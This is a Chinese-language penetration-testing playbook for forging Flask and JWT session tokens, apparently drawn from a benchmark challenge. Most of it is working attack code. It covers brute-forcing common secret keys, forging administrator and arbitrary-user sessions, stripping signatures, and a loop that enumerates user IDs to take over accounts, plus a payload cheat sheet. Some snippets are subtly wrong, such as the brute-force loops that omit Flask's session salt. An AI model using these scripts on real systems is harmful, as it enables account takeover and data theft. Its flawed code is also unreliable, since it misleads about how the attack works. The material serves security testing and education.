# 会话伪造攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的会话伪造攻击检测与利用流程，帮助发现和利用因硬编码密钥、弱签名算法等导致的会话令牌伪造漏洞。

## 1.2 适用范围

本文档适用于使用客户端会话存储机制的 Web 应用，特别是：
- Flask 应用（使用 itsdangerous 库签名）
- Django 应用（使用签名 Cookie）
- 其他使用 HMAC 签名的会话系统
- JWT 令牌认证系统

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

会话伪造攻击是指攻击者通过已知或可预测的密钥，伪造合法的会话令牌，从而绕过认证机制获得未授权访问。

**本质问题**：
- 硬编码的会话密钥暴露在源代码中
- 使用弱密钥或默认密钥
- 密钥管理不当（提交到版本控制系统）
- 签名算法可被绕过

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-259 | 使用硬编码密码 |
| CWE-347 | 签名验证不当 |
| CWE-287 | 身份验证不当 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| Flask 应用 | 会话 Cookie | 硬编码 `app.secret_key` |
| JWT 认证 | API 令牌 | 弱密钥或默认密钥 |
| 会话管理 | 用户登录 | 签名算法可绕过 |
| 微服务 | 服务间认证 | 共享密钥泄露 |

## 2.3 漏洞发现方法

### 2.3.1 源代码审计

**Flask 应用密钥检测**：

```bash
# 搜索硬编码密钥
grep -r "secret_key" --include="*.py" .
grep -r "SECRET_KEY" --include="*.py" .
grep -r "your_secret" --include="*.py" .
```

**常见硬编码模式**：

```python
# 危险模式 1：简单字符串
app.secret_key = 'your_secret_key'
app.secret_key = 'secret'
app.secret_key = 'changeme'

# 危险模式 2：可预测值
app.secret_key = 'flask_session_key'
app.secret_key = __file__

# 危险模式 3：提交到版本控制
# 在 GitHub 等公开仓库中搜索密钥
```

### 2.3.2 会话令牌分析

```bash
# 获取会话 Cookie
curl -v http://target.com/login

# Flask 会话格式：
# session=.{base64_payload}.{timestamp}.{signature}
# 例如：.eJwFwcENwCAIBNCVHNkC41A2cR8L1YhRYkzcuPP-vAA13i...
```

### 2.3.3 密钥爆破测试

```python
# 使用其 danger 库测试常见密钥
from itsdangerous import URLSafeTimedSerializer

common_keys = [
    'your_secret_key', 'secret', 'flask_secret',
    'changeme', 'dev', 'test', 'password'
]

for key in common_keys:
    try:
        serializer = URLSafeTimedSerializer(secret_key=key)
        # 尝试解码现有会话
        data = serializer.loads(session_cookie)
        print(f"Found valid key: {key}")
        break
    except:
        continue
```

## 2.4 漏洞利用方法

### 2.4.1 Flask 会话伪造

**前提条件**：
- 已知 Flask 应用的硬编码密钥
- Python 环境安装 itsdangerous 库

**利用步骤**：

```python
from itsdangerous import URLSafeTimedSerializer

# 1. 获取硬编码密钥（从源代码）
secret_key = 'your_secret_key'

# 2. 初始化序列化器（使用 Flask 默认 salt）
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session'  # Flask 默认会话 salt
)

# 3. 伪造目标用户的会话
# 假设目标用户 ID 为 10032
forged_session = serializer.dumps({'user_id': 10032})

print(f"Forged session cookie: {forged_session}")
```

**访问受保护资源**：

```bash
# 使用伪造的会话 Cookie
curl -s http://target.com/dashboard \
  -b "session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJNNA.F-0ZUl1ZkLkTa8QSOUKmg6RjpJM" \
  | grep "Welcome"
```

### 2.4.2 任意用户 impersonation

```python
# 伪造管理员会话
admin_session = serializer.dumps({
    'user_id': 1,
    'is_admin': True,
    'role': 'administrator'
})

# 伪造特定用户会话
target_user_session = serializer.dumps({
    'user_id': <target_user_id>,
    'username': '<target_username>'
})
```

### 2.4.3 会话权限提升

```python
# 在会话中添加额外权限字段
privileged_session = serializer.dumps({
    'user_id': 10032,
    'permissions': ['read', 'write', 'delete', 'admin'],
    'role': 'superuser',
    'is_authenticated': True
})
```

## 2.5 漏洞利用绕过方法

### 2.5.1 密钥变更检测

如果应用更新了密钥，尝试以下方法：

```python
# 1. 检查是否有多个密钥（密钥轮换）
keys_to_try = [
    'your_secret_key',
    'new_secret_key',
    'flask_secret_2024'
]

for key in keys_to_try:
    try:
        serializer = URLSafeTimedSerializer(secret_key=key)
        test_data = serializer.dumps({'test': True})
        # 尝试用伪造的会话访问
        response = requests.get(target_url, cookies={'session': test_data})
        if response.status_code == 200:
            print(f"Valid key found: {key}")
    except:
        continue
```

### 2.5.2 签名算法绕过

某些应用可能存在签名验证缺陷：

```python
# 尝试移除签名（某些应用可能不验证）
forged_cookie = forged_session.split('.')[0] + '..'

# 尝试使用空签名
empty_sig_cookie = forged_session.rsplit('.', 1)[0] + '.'
```

## 2.6 后渗透利用

### 2.6.1 敏感数据访问

```bash
# 访问用户数据
curl -b "session=<forged_session>" http://target.com/api/users/<target_id>

# 访问订单数据
curl -b "session=<forged_session>" http://target.com/api/orders/<target_order_id>

# 访问管理功能
curl -b "session=<forged_session>" http://target.com/admin/dashboard
```

### 2.6.2 横向移动

```python
# 遍历所有用户 ID
for user_id in range(1, 1000):
    session = serializer.dumps({'user_id': user_id})
    response = requests.get(
        'http://target.com/api/profile',
        cookies={'session': session}
    )
    if response.status_code == 200:
        print(f"Found valid user: {user_id}")
        # 保存会话用于后续利用
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 目标 | Payload | 说明 |
|-----|---------|------|
| Flask 默认会话 | `{'user_id': <id>}` | 标准 Flask 会话格式 |
| 管理员权限 | `{'user_id': 1, 'is_admin': True}` | 提升为管理员 |
| JWT 伪造 | `{"sub": "admin", "role": "admin"}` | JWT  claims |
| 空签名测试 | `payload..` | 测试签名验证 |

## 3.2 常见硬编码密钥列表

```
your_secret_key
secret
flask_secret
changeme
dev
test
password
admin
default
secret_key
```

## 3.3 工具推荐

| 工具 | 用途 |
|-----|------|
| itsdangerous | Flask 会话编解码 |
| jwt_tool | JWT 令牌测试 |
| Burp Suite | 会话拦截和修改 |
| secretscanner | 源代码密钥扫描 |

---

**文档版本**：1.0  
**最后更新**：2026-03-08  
**参考来源**：XBEN-001-24 渗透测试实战
